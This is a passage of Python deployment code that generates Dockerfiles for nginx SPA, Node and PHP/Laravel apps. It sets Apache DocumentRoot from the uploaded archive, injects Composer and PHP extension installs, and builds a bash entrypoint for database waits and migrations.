        spa_port = _resolve_spa_port(config, project_cfg, platform)

        rendered = _apply_spa_port(rendered, spa_port)

        if logger:
            logger.info(
                "dockerfile_generation",
                f"SPA nginx image: build_dir=/app/{build_dir}, port={spa_port}",
                progress=14,
                details={
                    "build_dir": build_dir,
                    "port": spa_port,
                    "platform": platform,
                    "path_rewritten": rendered != before,
                    "framework": getattr(project_cfg, "framework", None) if project_cfg else (info or {}).get("framework"),
                },
            )

        # NEVER inject "npx serve" / node CMDs into an nginx-only final stage.
        # Only honour a user entry_point when it is clearly an nginx-compatible
        # command (starts with nginx) – otherwise keep the template CMD.
        if entry_point_override and _is_nginx_compatible_cmd(entry_point_override):
            if logger:
                logger.info(
                    "dockerfile_generation",
                    f"Using nginx-compatible entry_point: {entry_point_override}",
                    progress=15,
                )
            return _replace_cmd(rendered, entry_point_override)

        if entry_point_override and logger:
            logger.info(
                "dockerfile_generation",
                f"Ignoring non-nginx entry_point on SPA template: {entry_point_override!r}",
                progress=15,
                details={"reason": "final stage is nginx:alpine (no node/npx)"},
            )

        if logger:
            logger.info(
                "dockerfile_generation",
                "Nginx SPA template – CMD=nginx, static files from build_dir.",
                progress=15,
                details={"build_dir": build_dir, "port": spa_port},
            )
        return rendered

    # ---- runtime Node apps (Next.js, Express, plain Node) ----
    if entry_point_override:
        return _replace_cmd(rendered, entry_point_override)

    if project_cfg and project_cfg.start_command:
        detected_start = project_cfg.start_command
        # The final runtime Node image always contains npm. When dependencies
        # were installed with pnpm/yarn/bun, invoking that package manager in
        # the final stage can fail because it is only needed in the builder.
        # npm run <script> uses the same node_modules and avoids that runtime
        # dependency.
        if isinstance(detected_start, str):
            m = re.match(r"^(?:pnpm|yarn|bun)(?:\s+run)?\s+(.+)$", detected_start.strip())
            if m and not detected_start.strip().startswith(("npm ", "node ")):
                detected_start = f"npm run {m.group(1).strip()}"
        if logger:
            logger.info(
                "dockerfile_generation",
                f"Using detected start command: {project_cfg.start_command}",
                progress=15,
                details={
                    "start_command": detected_start,
                    "build_dir": build_dir,
                    "framework": getattr(project_cfg, "framework", None),
                },
            )
        return _replace_cmd(rendered, detected_start)

    if logger:
        logger.info(
            "dockerfile_generation",
            "Using template default start command (platforms/ detection incomplete)",
            progress=15,
        )
    return rendered


def _php_member_names(tar_stream) -> list[str]:
    """Return normalized file paths from the deployment archive."""
    if tar_stream is None:
        return []
    names: list[str] = []
    try:
        import tarfile as _tf

        tar_stream.seek(0)
        with _tf.open(fileobj=tar_stream, mode="r:*") as tar:
            for member in tar.getmembers():
                if not member.isfile() and not member.isdir():
                    continue
                n = member.name.replace("\\", "/").lstrip("./")
                if not n or n in {".", ".."} or "/../" in f"/{n}/":
                    continue
                names.append(n)
        tar_stream.seek(0)
    except Exception:
        try:
            tar_stream.seek(0)
        except Exception:
            pass
    return names


def _detect_php_document_root(
    tar_stream,
    *,
    user_override: str | None = None,
    project_cfg=None,
) -> str:
    """
    Resolve Apache DocumentRoot relative to ``/var/www/html`` **after**
    the build-context flatten step.

    The image build strips a single top-level archive directory (GitHub
    zips, commit-hash folders, etc.).  Therefore this function always
    returns a path relative to the *application* root, never including
    that outer wrapper directory.

    Returns a relative path such as ``""`` (→ ``/var/www/html``) or
    ``"public"``.  Never returns an absolute path.

    Priority
    --------
    1. Explicit user override (Deploy.config document_root / DOCUMENT_ROOT)
    2. Laravel / Symfony style: shallowest ``…/public/index.php``
    3. Plain PHP: shallowest ``index.php``
    4. Platform inspect hint (``static_dir`` / ``document_root``)
    5. Fallback: ``""`` → ``/var/www/html``
    """
    def _clean_rel(path: str) -> str:
        p = (path or "").replace("\\", "/").strip().lstrip("./").rstrip("/")
        if p in {"", ".", ".."} or p.startswith("/") or "/../" in f"/{p}/":
            return ""
        return p

    def _strip_prefix(rel: str, prefix: str) -> str:
        """Remove a single top-level archive directory from *rel*."""
        if not prefix or not rel:
            return rel
        if rel == prefix:
            return ""
        if rel.startswith(prefix + "/"):
            return rel[len(prefix) + 1 :]
        return rel

    if user_override and str(user_override).strip():
        # User overrides are relative to the app root (post-flatten).
        return _clean_rel(str(user_override))

    names = _php_member_names(tar_stream)
    if not names:
        if project_cfg is not None:
            sd = getattr(project_cfg, "static_dir", None) or getattr(
                project_cfg, "document_root", None
            )
            if sd and str(sd).strip().lower() in ("public", "web", "www"):
                return _clean_rel(str(sd))
        return ""

    file_names = [n for n in names if not n.endswith("/")]
    # The image build strips a single top-level archive directory via
    # flatten_single_toplevel; use the shared helper so every path this
    # function returns is relative to the *post-flatten* build context.
    single_prefix = detect_archive_wrapper(names)

    def _depth(path: str) -> int:
        return path.count("/")

    public_indexes = [
        n for n in file_names
        if n.endswith("/public/index.php") or n == "public/index.php"
    ]
    plain_indexes = [
        n for n in file_names
        if n == "index.php" or n.endswith("/index.php")
    ]

    chosen_index: str | None = None
    if public_indexes:
        chosen_index = min(public_indexes, key=_depth)
    elif plain_indexes:
        chosen_index = min(plain_indexes, key=_depth)

    if chosen_index:
        rel = chosen_index.rsplit("/", 1)[0] if "/" in chosen_index else ""
        # Critical: image build flattens single_prefix, so DocumentRoot
        # must be relative to the *inner* app root.
        return _clean_rel(_strip_prefix(rel, single_prefix))

    if project_cfg is not None:
        sd = getattr(project_cfg, "static_dir", None) or getattr(
            project_cfg, "document_root", None
        )
        if sd and str(sd).strip():
            # project_cfg paths are already relative to the app root
            return _clean_rel(str(sd))

    # No index.php found — still do not return the wrapper dir; after
    # flatten the app root *is* /var/www/html.
    return ""


def _apply_php_document_root(dockerfile: str, document_root_rel: str) -> str:
    """
    Point Apache DocumentRoot at the real application path inside the image.

    ``document_root_rel`` is relative to ``/var/www/html`` (may be empty).

    Writes a literal 000-default.conf (via base64) so Apache always serves
    the correct directory even when the zip unpacks into a single top-level
    folder. Strips older ``sed ... APACHE_DOCUMENT_ROOT`` lines that would
    nest the path (e.g. /var/www/html/App/App).
    """
    rel = (document_root_rel or "").replace("\\", "/").strip().lstrip("./").rstrip("/")
    if rel in {".", ".."} or rel.startswith("/") or "/../" in f"/{rel}/":
        rel = ""
    absolute = f"/var/www/html/{rel}" if rel else "/var/www/html"

    # 1) ENV
    if re.search(r"^ENV\s+APACHE_DOCUMENT_ROOT=", dockerfile, re.MULTILINE):
        dockerfile = re.sub(
            r"^ENV\s+APACHE_DOCUMENT_ROOT=.*$",
            f"ENV APACHE_DOCUMENT_ROOT={absolute}",
            dockerfile,
            count=1,
            flags=re.MULTILINE,
        )
    else:
        dockerfile = re.sub(
            r"(^FROM\s+[^\n]+\n)",
            rf"\1\nENV APACHE_DOCUMENT_ROOT={absolute}\n",
            dockerfile,
            count=1,
            flags=re.MULTILINE,
        )

    # 2) Remove previous auto block
    dockerfile = re.sub(
        r"\n# --- Apache DocumentRoot \(auto\) ---[\s\S]*?(?=\n(?:RUN|COPY|WORKDIR|EXPOSE|CMD|ENTRYPOINT|ENV|FROM|#)|$)",
        "\n",
        dockerfile,
        count=1,
    )

    # 3) Strip generic sed that rewrites /var/www/html -> ${ENV}
    dockerfile = re.sub(
        r"\s*&&\s*sed\s+-ri\s+-e\s+'s!/var/www/html!\$\{APACHE_DOCUMENT_ROOT\}!g'\s+/etc/apache2/sites-available/\*\.conf",
        "",
        dockerfile,
    )
    dockerfile = re.sub(
        r"\s*&&\s*sed\s+-ri\s+-e\s+'s!/var/www/!\$\{APACHE_DOCUMENT_ROOT\}!g'\s+/etc/apache2/apache2\.conf\s+/etc/apache2/conf-available/\*\.conf",
        "",
        dockerfile,
    )

    # Real newlines in the conf body (base64-encoded into the Dockerfile so
    # we never depend on printf \n expansion or shell quoting).
    conf_body = (
        "ServerName localhost\n"
        "<VirtualHost *:80>\n"
        "    ServerAdmin webmaster@localhost\n"
        f"    DocumentRoot {absolute}\n"
        f"    <Directory {absolute}>\n"
        "        Options FollowSymLinks\n"
        "        AllowOverride All\n"
        "        Require all granted\n"
        "        DirectoryIndex index.php index.html\n"
        "    </Directory>\n"
        "    ErrorLog ${APACHE_LOG_DIR}/error.log\n"
        "    CustomLog ${APACHE_LOG_DIR}/access.log combined\n"
        "</VirtualHost>\n"
    )
    b64 = base64.b64encode(conf_body.encode("utf-8")).decode("ascii")

    # Write the full VirtualHost via base64 — do NOT run a follow-up sed
    # that rewrites "DocumentRoot /var/www/html" because the conf we just
    # wrote already contains the correct absolute path; a prefix sed would
    # double it (e.g. /var/www/html/HASH → /var/www/html/HASH/HASH).
    apache_block = (
        "\n# --- Apache DocumentRoot (auto) ---\n"
        f"RUN echo '{b64}' | base64 -d > /etc/apache2/sites-available/000-default.conf \\\n"
        "    && sed -i 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.conf \\\n"
        "    && (grep -q '^ServerName ' /etc/apache2/apache2.conf || echo 'ServerName localhost' >> /etc/apache2/apache2.conf) \\\n"
        "    && a2enmod rewrite headers \\\n"
        f"    && test -d {absolute} || (echo \"WARNING: DocumentRoot {absolute} missing\" >&2)\n"
    )

    if re.search(r"^COPY\s+\.\s+/var/www/html/?\s*$", dockerfile, re.MULTILINE):
        dockerfile = re.sub(
            r"^(COPY\s+\.\s+/var/www/html/?\s*)$",
            lambda m: m.group(1) + "\n" + apache_block,
            dockerfile,
            count=1,
            flags=re.MULTILINE,
        )
    else:
        dockerfile = dockerfile.rstrip() + "\n" + apache_block

    dockerfile = re.sub(r"\n{3,}", "\n\n", dockerfile)
    # Drop orphan backslash runs left by sed-line removal
    while " \\ \\ " in dockerfile or "\\ \\ \\" in dockerfile:
        dockerfile = dockerfile.replace(" \\ \\ ", " ")
        dockerfile = dockerfile.replace("\\ \\ \\", "\\")
    return dockerfile



_PHP_EXT_PACKAGE_MAP = {
    "intl": ("libicu-dev", "intl"),
    "zip": ("libzip-dev", "zip"),
    "gd": ("libfreetype6-dev libjpeg62-turbo-dev libpng-dev", "gd"),
    "pgsql": ("libpq-dev", "pdo_pgsql"),
    "pdo_pgsql": ("libpq-dev", "pdo_pgsql"),
    "soap": ("libxml2-dev", "soap"),
    "bcmath": ("", "bcmath"),
    "mbstring": ("", "mbstring"),
    "opcache": ("", "opcache"),
    "mysqli": ("", "mysqli"),
    "pdo_mysql": ("", "pdo_mysql"),
}


def _composer_info(tar_stream) -> dict:
    info = {"php_constraint": None, "extensions": []}
    try:
        import json as _json
        import tarfile as _tf
        tar_stream.seek(0)
        with _tf.open(fileobj=tar_stream, mode="r:*") as tar:
            candidates = [m for m in tar.getmembers() if m.isfile() and m.name.replace("\\", "/").lstrip("./").endswith("composer.json")]
            candidate = min(candidates, key=lambda m: m.name.count("/"), default=None)
            if candidate is not None:
                f = tar.extractfile(candidate)
                if f is not None:
                    data = _json.loads(f.read().decode("utf-8", "ignore"))
                    req = dict(data.get("require") or {})
                    info["php_constraint"] = str(req.get("php")) if req.get("php") else None
                    info["extensions"] = sorted({str(k)[4:].lower() for k in req if str(k).lower().startswith("ext-")})
    except Exception:
        pass
    finally:
        try:
            tar_stream.seek(0)
        except Exception:
            pass
    return info


def _php_min_version(constraint: str | None) -> str | None:
    """
    Extract the highest PHP 8.x minor mentioned in a composer constraint
    (e.g. ``^8.4``, ``>=8.4.1``, ``8.3.*`` → ``8.4`` / ``8.3``).
    """
    if not constraint:
        return None
    versions = re.findall(r"\b(8\.\d+)\b", str(constraint))
    if not versions:
        return None
    return max(versions, key=lambda v: tuple(map(int, v.split("."))))


def _resolve_php_image_version(
    *,
    constraint: str | None,
    is_laravel: bool,
    configured: str | None = None,
) -> str:
    """
    Pick the Docker PHP tag (e.g. ``8.4``) for the image.

    Priority: composer.json constraint > explicit config > Laravel default 8.4
    > plain PHP default 8.2.
    """
    from_constraint = _php_min_version(constraint)
    if from_constraint:
        return from_constraint
    if configured and re.match(r"^8\.\d+", str(configured).strip()):
        return str(configured).strip().split("-")[0]
    if is_laravel:
        return "8.4"
    return "8.2"


def _inject_php_extensions(dockerfile: str, extensions: list[str]) -> str:
    apt_packages = set()
    php_extensions = set()
    for ext in extensions:
        meta = _PHP_EXT_PACKAGE_MAP.get(ext)
        if not meta:
            continue
        pkg, php_ext = meta
        if pkg:
            apt_packages.update(pkg.split())
        php_extensions.add(php_ext)
    if not php_extensions and not apt_packages:
        return dockerfile
    blocks = ["\n# --- Composer-required PHP extensions ---"]
    if apt_packages:
        blocks.append(
            "RUN apt-get update && apt-get install -y --no-install-recommends "
            + " ".join(sorted(apt_packages))
            + " && rm -rf /var/lib/apt/lists/*"
        )
    existing = dockerfile.lower()
    install = [e for e in sorted(php_extensions) if not re.search(r"docker-php-ext-install[^\n]*\b"+re.escape(e)+r"\b", existing, re.I)]
    if install:
        blocks.append("RUN docker-php-ext-install " + " ".join(install))
    return dockerfile.rstrip() + "\n" + "\n".join(blocks) + "\n"


def _detect_php_project(tar_stream) -> dict:
    """
    Inspect the deployment archive for PHP framework / schema signals.

    Returns keys:
      is_laravel, has_composer, has_artisan, schema_files, has_vendor.
    """
    info = {
        "is_laravel": False,
        "has_composer": False,
        "has_artisan": False,
        "schema_files": [],
        "has_vendor": False,
        "composer": {"php_constraint": None, "extensions": []},
    }
    if tar_stream is None:
        return info
    try:
        import tarfile as _tf
        import json as _json

        tar_stream.seek(0)
        with _tf.open(fileobj=tar_stream, mode="r:*") as tar:
            names = []
            for member in tar.getmembers():
                n = member.name.replace("\\", "/").lstrip("./")
                if not n or n in {".", ".."} or "/../" in f"/{n}/":
                    continue
                names.append(n)

            for n in names:
                base = n.rsplit("/", 1)[-1]
                depth = 0 if "/" not in n else n.count("/")
                # Accept composer.json up to depth 3 (wrapper/app/composer.json)
                if base == "composer.json" and depth <= 3:
                    info["has_composer"] = True
                    try:
                        m = next(
                            (
                                x
                                for x in tar.getmembers()
                                if x.name.replace("\\", "/").lstrip("./") == n
                            ),
                            None,
                        )
                        if m is not None:
                            fobj = tar.extractfile(m)
                            if fobj is not None:
                                pkg = _json.loads(
                                    fobj.read().decode("utf-8", "ignore")
                                )
                                req = {
                                    **(pkg.get("require") or {}),
                                    **(pkg.get("require-dev") or {}),
                                }
                                if any(k.startswith("laravel/") for k in req):
                                    info["is_laravel"] = True
                                # Collect ext-* for later injection
                                info["composer"]["php_constraint"] = (
                                    str(req["php"]) if req.get("php") else None
                                )
                                info["composer"]["extensions"] = sorted(
                                    {
                                        str(k)[4:].lower()
                                        for k in req
                                        if str(k).lower().startswith("ext-")
                                    }
                                )
                    except Exception:
                        pass
                if base == "artisan" and depth <= 3:
                    info["has_artisan"] = True
                    info["is_laravel"] = True
                # Only treat as "vendor present" when autoload.php exists
                if n.endswith("vendor/autoload.php") and not n.endswith(
                    "vendor/autoload.php/"
                ):
                    info["has_vendor"] = True

            schema_candidates = (
                "schema.sql",
                "database.sql",
                "db.sql",
                "init.sql",
                "migrate.sql",
                "migrations.sql",
                "sql/schema.sql",
                "sql/init.sql",
                "database/schema.sql",
                "database/init.sql",
                "install/schema.sql",
                "install.sql",
            )
            name_set = set(names)
            for cand in schema_candidates:
                if cand in name_set:
                    info["schema_files"].append(cand)
                    continue
                for n in names:
                    if n.endswith("/" + cand) and n.count("/") <= 2:
                        info["schema_files"].append(n)
                        break

            sql_files = sorted(
                n
                for n in names
                if n.endswith(".sql")
                and n.count("/") <= 2
                and not n.startswith("vendor/")
                and "test" not in n.lower()
            )
            for n in sql_files:
                if n not in info["schema_files"] and len(info["schema_files"]) < 5:
                    info["schema_files"].append(n)

        tar_stream.seek(0)
        info["composer"] = _composer_info(tar_stream)
        tar_stream.seek(0)
    except Exception:
        try:
            tar_stream.seek(0)
        except Exception:
            pass
    return info


def _php_entrypoint_script(
    *,
    is_laravel: bool,
    schema_files: list,
    doc_root_rel: str = "",
) -> str:
    """
    Shell entrypoint that:
      1. Ensures vendor/ via composer if missing (Laravel #1 failure mode)
      2. Waits for DB
      3. Runs migrations / schema
      4. Starts Apache
    """
    app_root = "/var/www/html"
    if doc_root_rel:
        if doc_root_rel.endswith("/public"):
            parent = doc_root_rel[: -len("/public")].rstrip("/")
            app_root = f"/var/www/html/{parent}" if parent else "/var/www/html"
        elif doc_root_rel == "public":
            app_root = "/var/www/html"
        else:
            app_root = f"/var/www/html/{doc_root_rel}".rstrip("/") or "/var/www/html"

    safe_schemas = [
        s for s in (schema_files or [])
        if s and ".." not in s and not s.startswith("/") and not s.startswith("\\")
    ]
    schema_list = " ".join(f'"{s}"' for s in safe_schemas)

    lines = [
        "#!/bin/bash",
        "set -e",
        f'APP_ROOT="{app_root}"',
        'cd "$APP_ROOT" 2>/dev/null || cd /var/www/html || true',
        "",
        'DB_HOST="${DB_HOST:-${MYSQL_HOST:-}}"',
        'DB_PORT="${DB_PORT:-${MYSQL_PORT:-3306}}"',
        'DB_USER="${DB_USERNAME:-${DB_USER:-${MYSQL_USER:-root}}}"',
        'DB_PASS="${DB_PASSWORD:-${MYSQL_PASSWORD:-${MYSQL_ROOT_PASSWORD:-}}}"',
        'DB_NAME="${DB_DATABASE:-${MYSQL_DATABASE:-}}"',
        "",
        # ------------------------------------------------------------------
        # Ensure Composer dependencies exist.  Build-time install can be
        # skipped (stale template, missing composer.json detection, network
        # failure).  Without vendor/autoload.php Laravel fatals immediately.
        # ------------------------------------------------------------------
        "ensure_composer_vendor() {",
        '  if [ -f "$APP_ROOT/vendor/autoload.php" ]; then',
        '    echo "[entrypoint] vendor/autoload.php present."',
        "    return 0",
        "  fi",
        '  if [ ! -f "$APP_ROOT/composer.json" ]; then',
        '    echo "[entrypoint] WARNING: no composer.json and no vendor/ — app may fail."',
        "    return 0",
        "  fi",
        '  echo "[entrypoint] vendor/ missing — running composer install ..."',
        "  export COMPOSER_ALLOW_SUPERUSER=1 COMPOSER_MEMORY_LIMIT=-1",
        "  if ! command -v composer >/dev/null 2>&1; then",
        '    echo "[entrypoint] composer binary missing; downloading ..."',
        "    php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\" \\",
        "      && php composer-setup.php --install-dir=/usr/local/bin --filename=composer \\",
        "      && rm -f composer-setup.php \\",
        "      || { echo '[entrypoint] ERROR: cannot install composer' >&2; return 1; }",
        "  fi",
        '  cd "$APP_ROOT"',
        "  composer install \\",
        "    --no-dev \\",
        "    --prefer-dist \\",
        "    --no-interaction \\",
        "    --no-progress \\",
        "    --optimize-autoloader \\",
        "    --no-scripts \\",
        "    || { echo '[entrypoint] ERROR: composer install failed' >&2; return 1; }",
        '  if [ ! -f "$APP_ROOT/vendor/autoload.php" ]; then',
        '    echo "[entrypoint] ERROR: vendor/autoload.php still missing after composer install" >&2',
        "    return 1",
        "  fi",
        '  echo "[entrypoint] composer install finished."',
        "  return 0",
        "}",
        "",
        # Always run for Laravel: package:discover, storage, SQLite, APP_KEY.
        "bootstrap_laravel() {",
        '  if [ ! -f "$APP_ROOT/artisan" ]; then return 0; fi',
        '  cd "$APP_ROOT" || return 0',
        '  mkdir -p storage/framework/cache storage/framework/sessions '
        "storage/framework/views storage/logs bootstrap/cache",
        "  chmod -R ug+rwx storage bootstrap/cache 2>/dev/null || true",
        '  DB_CONN="${DB_CONNECTION:-}"',
        '  if [ -z "$DB_CONN" ] && [ -f .env ]; then',
        "    DB_CONN=$(grep -E '^DB_CONNECTION=' .env 2>/dev/null | head -n1 | cut -d= -f2- | tr -d '\\r' | tr -d '\"' | tr -d \"'\")",
        "  fi",
        '  if [ -z "$DB_CONN" ] && [ -f .env.example ]; then',
        "    DB_CONN=$(grep -E '^DB_CONNECTION=' .env.example 2>/dev/null | head -n1 | cut -d= -f2- | tr -d '\\r' | tr -d '\"' | tr -d \"'\")",
        "  fi",
        '  DB_CONN=$(echo "${DB_CONN:-sqlite}" | tr "[:upper:]" "[:lower:]")',
        '  export DB_CONNECTION="$DB_CONN"',
        '  if [ "$DB_CONN" = "sqlite" ]; then',
        '    echo "[entrypoint] SQLite detected — ensuring database file"',
        "    mkdir -p database",
        '    DB_FILE="${DB_DATABASE:-}"',
        '    if [ -z "$DB_FILE" ] || [ "$DB_FILE" = "database" ]; then',
        '      DB_FILE="$APP_ROOT/database/database.sqlite"',
        "    fi",
        '    case "$DB_FILE" in',
        "      /*) ;;",
        '      *) DB_FILE="$APP_ROOT/$DB_FILE" ;;',
        "    esac",
        '    if [ ! -f "$DB_FILE" ]; then',
        '      touch "$DB_FILE" 2>/dev/null || true',
        "    fi",
        '    chmod ug+rw "$DB_FILE" 2>/dev/null || true',
        '    export DB_DATABASE="$DB_FILE"',
        "  fi",
        '  if [ ! -f .env ] && [ -f .env.example ]; then',
        '    echo "[entrypoint] Creating .env from .env.example"',
        "    cp .env.example .env",
        "  fi",
        '  if [ -f .env ] && [ -w .env ]; then',
        '    if [ -n "${APP_KEY:-}" ] && ! grep -qE "^APP_KEY=base64:" .env 2>/dev/null; then',
        "      sed -i '/^APP_KEY=/d' .env 2>/dev/null || true",
        '      echo "APP_KEY=$APP_KEY" >> .env',
        "    fi",
        '    if [ -n "${DB_CONNECTION:-}" ]; then',
        "      sed -i '/^DB_CONNECTION=/d' .env 2>/dev/null || true",
        '      echo "DB_CONNECTION=$DB_CONNECTION" >> .env',
        "    fi",
        '    if [ -n "${DB_DATABASE:-}" ]; then',
        "      sed -i '/^DB_DATABASE=/d' .env 2>/dev/null || true",
        '      echo "DB_DATABASE=$DB_DATABASE" >> .env',
        "    fi",
        "  fi",
        '  echo "[entrypoint] Running package:discover ..."',
        '  php artisan package:discover --ansi 2>/dev/null || true',
        '  if [ -z "${APP_KEY:-}" ] && [ -f .env ] && ! grep -qE "^APP_KEY=base64:" .env 2>/dev/null; then',
        '    echo "[entrypoint] Generating APP_KEY ..."',
        "    php artisan key:generate --force --ansi 2>/dev/null || true",
        "  fi",
        "  php artisan config:clear 2>/dev/null || true",
        "  php artisan view:clear 2>/dev/null || true",
        "  chown -R www-data:www-data storage bootstrap/cache database 2>/dev/null || true",
        "  return 0",
        "}",
        "",
        "wait_for_db() {",
        '  DB_CONN=$(echo "${DB_CONNECTION:-sqlite}" | tr "[:upper:]" "[:lower:]")',
        '  if [ "$DB_CONN" = "sqlite" ]; then',
        '    echo "[entrypoint] SQLite — skip network DB wait."',
        "    return 0",
        "  fi",
        '  if [ -z "$DB_HOST" ]; then return 0; fi',
        '  echo "[entrypoint] Waiting for database at $DB_HOST:$DB_PORT ..."',
        "  for i in $(seq 1 60); do",
        "    if php -r '",
        '      $h=getenv("DB_HOST")?:getenv("MYSQL_HOST");',
        '      $p=(int)(getenv("DB_PORT")?:getenv("MYSQL_PORT")?:3306);',
        '      $u=getenv("DB_USERNAME")?:getenv("DB_USER")?:getenv("MYSQL_USER")?:"root";',
        '      $w=getenv("DB_PASSWORD")?:getenv("MYSQL_PASSWORD")?:getenv("MYSQL_ROOT_PASSWORD")?:"";',
        '      $d=getenv("DB_DATABASE")?:getenv("MYSQL_DATABASE")?:"";',
        "      try { $m=@new mysqli($h,$u,$w,$d?:\\\"\\\",$p); if($m&&!$m->connect_errno){$m->close();exit(0);} } catch(Throwable $e){}",
        "      exit(1);",
        "    ' 2>/dev/null; then",
        '      echo "[entrypoint] Database is reachable."; return 0;',
        "    fi",
        "    sleep 2",
        "  done",
        '  echo "[entrypoint] WARNING: database not reachable after 120s; continuing."',
        "  return 0",
        "}",
        "",
        "run_laravel_migrate() {",
        '  if [ ! -f "$APP_ROOT/artisan" ]; then return 0; fi',
        '  cd "$APP_ROOT" || return 0',
        '  DB_CONN=$(echo "${DB_CONNECTION:-}" | tr "[:upper:]" "[:lower:]")',
        '  if [ -z "$DB_CONN" ] && [ -f .env ]; then',
        "    DB_CONN=$(grep -E '^DB_CONNECTION=' .env 2>/dev/null | head -n1 | cut -d= -f2- | tr -d '\\r' | tr -d '\"' | tr -d \"'\")",
        "  fi",
        '  DB_CONN=$(echo "${DB_CONN:-sqlite}" | tr "[:upper:]" "[:lower:]")',
        '  if [ "$DB_CONN" = "sqlite" ]; then',
        "    mkdir -p database",
        '    DB_FILE="${DB_DATABASE:-$APP_ROOT/database/database.sqlite}"',
        '    case "$DB_FILE" in /*) ;; *) DB_FILE="$APP_ROOT/$DB_FILE" ;; esac',
        '    [ -f "$DB_FILE" ] || touch "$DB_FILE" 2>/dev/null || true',
        '    export DB_CONNECTION=sqlite',
        '    export DB_DATABASE="$DB_FILE"',
        "  fi",
        '  echo "[entrypoint] Running Laravel migrations (DB_CONNECTION=$DB_CONN)..."',
        '  php artisan migrate --force || {',
        '    echo "[entrypoint] WARNING: artisan migrate failed (non-fatal)." >&2',
        '    return 0',
        '  }',
        '  echo "[entrypoint] Laravel migrations finished."',
        "}",
        "",
"run_schema_sql() {",
        f'  SCHEMA_FILES="{schema_list}"',
        '  if [ -z "$SCHEMA_FILES" ]; then return 0; fi',
        '  if [ -z "$DB_HOST" ] || [ -z "$DB_NAME" ]; then',
        '    echo "[entrypoint] Skipping schema import (DB_HOST/DB_DATABASE not set)."',
        "    return 0",
        "  fi",
        '  MARKER="/tmp/.paas_schema_imported"',
        '  if [ -f "$MARKER" ]; then',
        '    echo "[entrypoint] Schema already imported; skipping."',
        "    return 0",
        "  fi",
        '  echo "[entrypoint] Importing SQL schema files..."',
        "  for f in $SCHEMA_FILES; do",
        '    path=""',
        '    if [ -f "$APP_ROOT/$f" ]; then path="$APP_ROOT/$f"',
        '    elif [ -f "/var/www/html/$f" ]; then path="/var/www/html/$f"; fi',
        '    if [ -z "$path" ]; then echo "[entrypoint] Schema not found: $f"; continue; fi',
        '    echo "[entrypoint] Importing $path ..."',
        "    php -r '",
        '      $h=getenv("DB_HOST")?:getenv("MYSQL_HOST");',
        '      $p=(int)(getenv("DB_PORT")?:getenv("MYSQL_PORT")?:3306);',
        '      $u=getenv("DB_USERNAME")?:getenv("DB_USER")?:getenv("MYSQL_USER")?:"root";',
        '      $w=getenv("DB_PASSWORD")?:getenv("MYSQL_PASSWORD")?:getenv("MYSQL_ROOT_PASSWORD")?:"";',
        '      $d=getenv("DB_DATABASE")?:getenv("MYSQL_DATABASE");',
        "      $file=$argv[1];",
        "      $m=new mysqli($h,$u,$w,$d,$p);",
        '      if($m->connect_errno){fwrite(STDERR,$m->connect_error);exit(1);}',
        '      $sql=file_get_contents($file);',
        '      if($sql===false){fwrite(STDERR,"cannot read");exit(1);}',
        "      if($m->multi_query($sql)){do{if($r=$m->store_result()){$r->free();}}while($m->more_results()&&$m->next_result());}",
        '      if($m->errno){fwrite(STDERR,$m->error);exit(1);}',
        "      $m->close(); echo \"OK\\n\";",
        "    ' \"$path\" || echo \"[entrypoint] WARNING: failed to import $path\"",
        "  done",
        '  touch "$MARKER" 2>/dev/null || true',
        '  echo "[entrypoint] Schema import finished."',
        "}",
        "",
        "ensure_composer_vendor",
        "bootstrap_laravel",
        "wait_for_db",
    ]

    if is_laravel:
        lines.append("run_laravel_migrate")
    else:
        lines.append("run_schema_sql")

    lines.extend(
        [
            'echo "[entrypoint] Starting Apache..."',
            "exec apache2-foreground",
            "",
        ]
    )
    return "\n".join(lines)


def _inject_php_runtime(
    dockerfile: str,
    *,
    info: dict,
    doc_root_rel: str = "",
    logger=None,
) -> str:
    """Inject composer (build) + migration entrypoint (runtime) into PHP image."""
    is_laravel = bool(info.get("is_laravel") or info.get("has_artisan"))
    has_composer = bool(info.get("has_composer"))
    schema_files = list(info.get("schema_files") or [])
    composer_meta = info.get("composer") or {}
    composer_exts = list(composer_meta.get("extensions") or [])
    if composer_exts:
        dockerfile = _inject_php_extensions(dockerfile, composer_exts)
    writable_dirs = list(info.get("writable_dirs") or [])
    if is_laravel:
        for d in ("storage", "bootstrap/cache"):
            if d not in writable_dirs:
                writable_dirs.append(d)

    # Archives often contain a single top-level project directory. The Apache
    # document root may therefore be /var/www/html/<project>/public while
    # composer/artisan must execute from /var/www/html/<project>.
    app_root = "/var/www/html"
    rel = (doc_root_rel or "").strip().strip("/")
    if rel:
        if rel == "public" or rel.endswith("/public"):
            parent = rel[:-7].rstrip("/") if rel.endswith("/public") else ""
            app_root = f"/var/www/html/{parent}" if parent else "/var/www/html"
        else:
            app_root = f"/var/www/html/{rel}"

    # ------------------------------------------------------------------
    # ALWAYS install composer deps for Laravel / any project with
    # composer.json when vendor/autoload.php is missing.
    # Do NOT trust the template: DB templates are often stale and lack
    # this step.  Strip any prior incomplete composer RUN then inject
    # a known-good block after COPY.
    # ------------------------------------------------------------------
    needs_vendor = (is_laravel or has_composer) and not info.get("has_vendor")
    if needs_vendor:
        # Remove previous injected composer blocks to avoid duplicates
        dockerfile = re.sub(
            r"\n# --- Composer dependencies \(injected by deployer\) ---[\s\S]*?"
            r"(?=\n(?:# ---|COPY|RUN|WORKDIR|EXPOSE|CMD|ENTRYPOINT|ENV|FROM)|$)",
            "\n",
            dockerfile,
            count=1,
        )
        # Ensure composer binary is present even if template already
        # mentioned "composer install" without shipping the binary.
        has_composer_bin = bool(
            re.search(
                r"COPY\s+--from=\S*composer\S*\s+/usr/bin/composer",
                dockerfile,
                re.IGNORECASE,
            )
        )
        composer_block = (
            "\n# --- Composer dependencies (injected by deployer) ---\n"
            "RUN apt-get update && apt-get install -y --no-install-recommends \\\n"
            "        git unzip libzip-dev \\\n"
            "    && (docker-php-ext-install zip 2>/dev/null || true) \\\n"
            "    && rm -rf /var/lib/apt/lists/*\n"
        )
        if not has_composer_bin:
            composer_block += (
                f"COPY --from={MIRROR_DOCKER}/composer:2 /usr/bin/composer /usr/bin/composer\n"
            )
        composer_block += (
            f"RUN cd {app_root} \\\n"
            "    && if [ ! -f composer.json ]; then \\\n"
            "         echo 'ERROR: composer.json not found in app root' >&2; exit 1; \\\n"
            "       fi \\\n"
            "    && COMPOSER_ALLOW_SUPERUSER=1 COMPOSER_MEMORY_LIMIT=-1 \\\n"
            "       composer install \\\n"
            "         --no-dev \\\n"
            "         --prefer-dist \\\n"
            "         --no-interaction \\\n"
